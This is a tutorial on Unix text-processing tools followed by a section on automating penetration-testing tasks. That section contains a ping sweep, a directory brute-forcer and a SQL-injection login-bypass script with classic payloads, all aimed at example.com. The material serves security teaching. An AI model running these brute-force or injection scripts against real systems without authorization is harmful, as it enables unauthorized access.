

Let's dive into the first two topics in more detail: **Text Processing Using Command Line Tools** and **Automating Exploitation Tasks with Bash and Python Scripts**.

### **1. Text Processing Using Command Line Tools**

Text processing in Unix/Linux systems is powerful, allowing you to manipulate and transform text data efficiently using various command-line tools. Here’s an overview of key tools and examples of how to use them:

#### **1.1 `cat` (Concatenate and Display Files)**

- **Basic Usage:**
  ```bash
  cat file.txt
  ```
  This command displays the content of `file.txt`.

- **Concatenate Multiple Files:**
  ```bash
  cat file1.txt file2.txt > combined.txt
  ```
  This combines `file1.txt` and `file2.txt` into a new file called `combined.txt`.

#### **1.2 `grep` (Search for Patterns in Text)**

- **Basic Search:**
  ```bash
  grep "pattern" file.txt
  ```
  This searches for "pattern" in `file.txt` and displays matching lines.

- **Search Recursively in Directories:**
  ```bash
  grep -r "pattern" /path/to/directory
  ```
  This searches for "pattern" in all files within the specified directory.

- **Case-Insensitive Search:**
  ```bash
  grep -i "pattern" file.txt
  ```
  The `-i` flag makes the search case-insensitive.

#### **1.3 `awk` (Text Processing Language)**

- **Print Specific Columns:**
  ```bash
  awk '{print $1, $3}' file.txt
  ```
  This command prints the first and third columns from `file.txt`.

- **Filter Lines Based on a Condition:**
  ```bash
  awk '$3 > 100 {print $0}' file.txt
  ```
  This prints all lines where the value in the third column is greater than 100.

- **Compute Average:**
  ```bash
  awk '{ total += $1; count++ } END { print total/count }' file.txt
  ```
  This calculates the average of the numbers in the first column.

#### **1.4 `sed` (Stream Editor for Text Transformation)**

- **Search and Replace:**
  ```bash
  sed 's/old/new/g' file.txt
  ```
  This replaces all occurrences of "old" with "new" in `file.txt`.

- **Delete Lines Matching a Pattern:**
  ```bash
  sed '/pattern/d' file.txt
  ```
  This deletes lines containing "pattern".

- **Insert Text After a Match:**
  ```bash
  sed '/pattern/a\New text' file.txt
  ```
  This adds "New text" after every line containing "pattern".

#### **1.5 `cut` (Cut Out Sections from Each Line)**

- **Extract Specific Fields:**
  ```bash
  cut -d":" -f1,3 /etc/passwd
  ```
  This extracts the first and third fields from `/etc/passwd`, assuming colon (`:`) as the delimiter.

- **Extract Specific Character Ranges:**
  ```bash
  cut -c1-10 file.txt
  ```
  This extracts the first 10 characters of each line in `file.txt`.

#### **1.6 `sort` (Sort Lines of Text Files)**

- **Sort Alphabetically:**
  ```bash
  sort file.txt
  ```
  This sorts the lines in `file.txt` alphabetically.

- **Sort Numerically:**
  ```bash
  sort -n file.txt
  ```
  This sorts the lines numerically.

- **Sort in Reverse Order:**
  ```bash
  sort -r file.txt
  ```
  This sorts the lines in reverse order.

#### **1.7 `uniq` (Remove Duplicate Lines)**

- **Remove Duplicate Lines:**
  ```bash
  sort file.txt | uniq
  ```
  This first sorts the file, then removes any duplicate lines.

- **Count Occurrences of Lines:**
  ```bash
  sort file.txt | uniq -c
  ```
  This counts and displays the number of occurrences for each line.

#### **1.8 `wc` (Word, Line, Character Count)**

- **Count Lines:**
  ```bash
  wc -l file.txt
  ```
  This counts the number of lines in `file.txt`.

- **Count Words:**
  ```bash
  wc -w file.txt
  ```
  This counts the number of words in `file.txt`.

- **Count Characters:**
  ```bash
  wc -m file.txt
  ```
  This counts the number of characters in `file.txt`.

### **2. Automating Exploitation Tasks with Bash and Python Scripts**

Automation is a crucial part of cybersecurity tasks, especially in penetration testing. Both Bash and Python are extensively used to automate various exploitation tasks.

#### **2.1 Automating Tasks with Bash Scripts**

Bash scripting is highly effective for automating repetitive tasks in a Unix/Linux environment.

- **Example: Automating Network Scanning**
  - **Script:**
    ```bash
    #!/bin/bash
    if [ -z "$1" ]; then
      echo "Usage: $0 <subnet>"
      exit 1
    fi
    
    for ip in $(seq 1 254); do
      ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
    done
    ```
  - **Explanation:**
    - This script automates the process of scanning a network subnet to find active hosts.
    - It uses a loop to ping each IP address in the specified subnet and filters the output to show only active hosts.

- **Example: Automating File Transfers**
  - **Script:**
    ```bash
    #!/bin/bash
    SRC_DIR="/path/to/source"
    DEST_DIR="/path/to/destination"
    
    rsync -av --delete $SRC_DIR $DEST_DIR
    ```
  - **Explanation:**
    - This script uses `rsync` to automate the process of syncing files between directories.
    - The `-av` options stand for "archive" and "verbose," while `--delete` removes files in the destination that no longer exist in the source.

#### **2.2 Automating Exploitation Tasks with Python Scripts**

Python offers a wide range of libraries that make it suitable for automating complex tasks, including those related to exploitation.

- **Example: Automating Directory Brute-Forcing**
  - **Script:**
    ```python
    import requests

    url = 'http://example.com/'
    wordlist = 'common.txt'

    with open(wordlist, 'r') as f:
        for line in f:
            directory = line.strip()
            response = requests.get(url + directory)
            if response.status_code == 200:
                print(f"[+] Found directory: {url + directory}")
    ```
  - **Explanation:**
    - This Python script automates the process of brute-forcing directories on a web server.
    - It reads from a wordlist (`common.txt`) and makes HTTP GET requests to check if each directory exists.

- **Example: Automating SQL Injection Detection**
  - **Script:**
    ```python
    import requests

    url = 'http://example.com/login.php'
    payloads = ["' OR 1=1--", "' OR 'a'='a", '" OR "a"="a']

    for payload in payloads:
        data = {'username': payload, 'password': 'password'}
        response = requests.post(url, data=data)
        if "Welcome" in response.text:
            print(f"[+] SQL Injection successful with payload: {payload}")
            break
    ```
  - **Explanation:**
    - This script automates the detection of SQL injection vulnerabilities by testing a list of common SQL payloads.
    - It sends these payloads to a login form and checks if the response indicates a successful login, suggesting a vulnerability.

These examples demonstrate how Bash and Python can be used to automate tasks in cybersecurity, streamlining processes that would otherwise be time-consuming if done manually. Both scripting languages are essential tools in the toolkit of a security professional.
